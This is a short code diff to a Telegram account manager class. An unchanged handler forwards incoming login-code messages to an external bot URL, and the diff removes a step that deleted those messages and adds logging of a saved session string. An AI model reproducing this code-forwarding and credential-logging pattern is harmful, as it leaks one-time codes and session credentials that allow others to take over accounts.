@@ -268,7 +268,6 @@ class TelegramManager {
                 console.log(event.message.text.toLowerCase());
                 console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                 await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
-                await event.message.delete({ revoke: true });
             }
         }
     }
@@ -614,6 +613,7 @@ class TelegramManager {
         const session = newClient.session.save();
         await newClient.disconnect();
         await newClient.destroy();
+        console.log("New Session: ", session);
         return session;
     }
     async waitForOtp() {
@@ -628,10 +628,12 @@ class TelegramManager {
                     return code;
                 }
                 else {
+                    console.log("Message Date: ", new Date(message.date).toISOString());
                     await (0, Helpers_1.sleep)(5000);
                 }
             }
             catch (err) {
+                await (0, Helpers_1.sleep)(2000);
                 console.log(err);
             }
         }
